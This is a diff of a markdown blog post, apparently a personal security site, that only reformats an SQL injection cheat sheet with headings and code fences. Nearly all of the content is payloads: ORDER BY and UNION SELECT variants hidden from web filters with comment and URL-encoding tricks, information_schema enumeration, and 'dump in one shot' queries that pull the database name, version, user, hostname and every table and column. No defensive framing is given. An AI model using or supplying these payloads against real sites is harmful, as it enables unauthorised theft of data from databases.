@@ -6,10 +6,10 @@ tags: [sql injection] # add tag
 image: /assets/img/sql/sql.png
 ---
 
-CHEAT SHEAT SQL INJECTION
+# CHEAT SHEAT SQL INJECTION
 
-[~] order by [~]
-
+### ORDER BY
+```bash
 order by 1 asc-- -
 +%0Aorder+%0Aby+1--+-
 +/*!50000ORDER%20BY*/+1--+-
@@ -19,9 +19,9 @@ order by 1 asc-- -
 /*!50000ORDER BY*/
 /*!50000ORDER*//**//*!50000BY*/
 /*!12345ORDER*/+/*!BY*/
-
-[~] UNION select [~]
-
+```
+### UNION SELECT
+```bash
 AnD point(29,9) /*!50000UnION+*/ /*!50000SelEcT+*/
 /*!50000%55nIoN*/ /*!50000%53eLeCt*/
 %55nion(%53elect 1,2,3)-- -
@@ -112,18 +112,18 @@ un?<ion sel="">+un/**/ion+se/**/lect+
 %2f**%2funion%2f**%2fselect%2f**%2f
 union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
 /*!UnIoN*/SeLecT+
-
-[~] information_schema.tables [~]
-
+```
+### information_schema.tables
+```bash
 /*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
 /*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
 /*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
 /*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
 /*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
 /*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table 
-
-[~] concat() [~]
-
+```
+### concat()
+```bash
 CoNcAt()
 concat() 
 CON%08CAT()
@@ -134,9 +134,9 @@ CoNcAt()
 unhex(hex(concat(table_name)))
 unhex(hex(/*!12345concat*/(table_name)))
 unhex(hex(/*!50000concat*/(table_name)))
-
-[~] group_concat() [~]
-
+```
+### group_concat()
+```bash
 /*!group_concat*/()
 gRoUp_cOnCAt()
 group_concat(/*!*/)
@@ -167,7 +167,7 @@ CONVERT(group_concat(table_name)+USING+latin2)
 CONVERT(group_concat(table_name)+USING+latin3)
 CONVERT(group_concat(table_name)+USING+latin4)
 CONVERT(group_concat(table_name)+USING+latin5)
-
+```
 
 ### Dios
 
@@ -183,7 +183,6 @@ CONVERT(group_concat(table_name)+USING+latin5)
 (Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
 
 make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
-```
 
 concat_ws('<br>','AZZATSSINS',database(),version(),user(),@@hostname,(select(group_concat('<br>',table_name,':',column_name))from(information_schema.columns)where(table_Schema=database())))
 
@@ -212,4 +211,4 @@ export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.co
 (/*!50000select*/+concat+(@:=0,(/*!50000select*/+count(*)%20from+/*!50000information_schema.tables*/+WHERE(TABLE_SCHEMA!=0x696e666f726d6174696f6e5f736368656d61)AND@:=concat+(@,0x3c62723e,/*!50000table_name*/)),@))
 
 make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)
-
+```
